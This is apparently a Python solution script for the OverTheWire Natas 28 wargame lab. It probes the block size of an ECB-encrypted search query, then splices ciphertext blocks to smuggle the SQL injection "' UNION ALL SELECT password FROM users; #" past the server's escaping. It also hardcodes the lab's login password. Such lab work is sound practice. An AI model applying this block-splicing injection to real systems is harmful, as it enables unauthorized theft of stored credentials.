import requests
from requests.auth import HTTPBasicAuth
import json
import datetime
import time
import string
from urllib import parse
import base64
import urllib



natasURL = 'http://natas28.natas.labs.overthewire.org/'
natas_usr   = 'natas28'
natas_pword = 'JWwR438wkgTsNKBbcJoowyysdM82YjeF'

r = requests.Session()
test_query = "A"

lw_chars = 'abcdefghijklmnopqrstuvwxyz'
up_chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
nb_chars = '0123456789'


# Look at the URL query cipher part
##resp = r.post(natasURL, auth=(natas_usr, natas_pword), data={'query':test_query})
##resp_url = resp.url
##print("Full URL is: " + resp_url +'\n')
##cipher = resp_url.split('=')[1]
##print("Cipher is: " + cipher + '\n')
##print("Length of cipher: " + str(len(cipher)))

# Testing for block length
##for i in range(1,30):
##    test_query = "A" * i
##    len_A = len(test_query)
##    resp = r.post(natasURL, auth=(natas_usr, natas_pword), data={'query':test_query})
##    resp_url = resp.url
##    cipher = resp_url.split('=')[1]
##    cipher = urllib.parse.unquote(cipher)
##    print("Input: " + test_query)
##    print("Input length: " + str(len_A))
##    print("Cipher is: "+ '\n' + cipher[0:16]+ '\n' + cipher[16:32]+ '\n' + cipher[32:48] + '\n' +
##          cipher[48:64]+ '\n'+ cipher[64:80]+ '\n'+ cipher[80:96]+ '\n'+cipher[96:]+ '\n')
##    print("Length: " + str(len(cipher)) + '\n')

#Altering the 10th character
##for ch in lw_chars:
##    test_query = "A" * 9 + ch
##    resp = r.post(natasURL, auth=(natas_usr, natas_pword), data={'query':test_query})
##    resp_url = resp.url
##    cipher = resp_url.split('=')[1]
##    cipher = urllib.parse.unquote(cipher)
##    cipher = base64.b64decode(cipher)
##    print(cipher)

##specialChars = ['A', '\'', '"', '\\', '/', '#', '?', '%']
##for char in specialChars:
##    resp = r.post(natasURL, auth=(natas_usr, natas_pword), data={'query':'A' * 11 + char, 'submit':'submit'})
##    print(char, ':', len((base64.b64decode(parse.parse_qs(parse.urlparse(resp.url).query)['query'][0])).hex()))
#This indicates that quote marks (one and two dash versions) and the \ character are using an escape.

#Now the idea is to split this escape chacter over 2 blocks to insert the a ' character and then our malicious sql.

#SQL cipher that won't work
sql_input = 'A' * 9 + "' UNION ALL SELECT password FROM users; # "
resp = r.post(natasURL, auth=(natas_usr, natas_pword), data={'query':sql_input})
resp_url = resp.url
url_back = resp_url.split('=')[1]
url_back = urllib.parse.unquote(url_back)
url_back = base64.b64decode(url_back.encode('utf-8'))
back = url_back[48:]


# A padding at the front
a_inp = 'A' * 10
resp = r.post(natasURL, auth=(natas_usr, natas_pword), data={'query':a_inp})
resp_url = resp.url
url_frt = resp_url.split('=')[1]
url_frt = urllib.parse.unquote(url_frt)
url_frt = base64.b64decode(url_frt.encode('utf-8'))
front = url_frt[:48]


final_inj = front + back
cipher_att = base64.b64encode(final_inj)
print("Search term: " + urllib.parse.quote(cipher_att))
new_url = 'http://natas28.natas.labs.overthewire.org/search.php'
resp = r.get(new_url,auth=(natas_usr, natas_pword), params={"query":cipher_att})

print(resp.text)


##    print("Input: " + test_query)
##    print("Cipher is: "+ '\n' + cipher[0:16]+ '\n' + cipher[16:32]+ '\n' + cipher[32:48] + '\n' +
##          cipher[48:64]+ '\n'+ cipher[64:80]+ '\n'+ cipher[80:96]+ '\n'+cipher[96:]+ '\n')
##    print("Length: " + str(len(cipher)) + '\n')  

# Construct an attack

